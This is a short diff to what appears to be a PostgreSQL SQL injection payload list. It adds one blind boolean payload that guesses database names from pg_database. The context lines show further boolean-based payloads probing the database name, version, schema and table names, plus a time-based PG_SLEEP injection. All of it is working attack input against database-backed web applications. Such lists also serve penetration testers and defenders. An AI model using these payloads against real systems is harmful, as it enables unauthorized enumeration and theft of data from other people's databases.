@@ -298,6 +298,7 @@ SELECT column1(int), column2(date), column3(varchar) FROM table1 UNION ALL SELEC
 ' or substr(current_database(),1,3) = 'tes
 ' or substr(version(),1,10) = 'PostgreSQL
 ' and substr(current_schema(),1,6) = 'public
+'or (SELECT substr(datname,1,1) FROM pg_database LIMIT 1)='p     #database name
 ' AND ASCII(SUBSTRING((SELECT tablename FROM pg_tables WHERE schemaname=public) ORDER BY tablename OFFSET 2 LIMIT 1)::text FROM 2 FOR 1)>90--
 ---------------------Time-Based---------------------
 ';SELECT PG_SLEEP(5)--
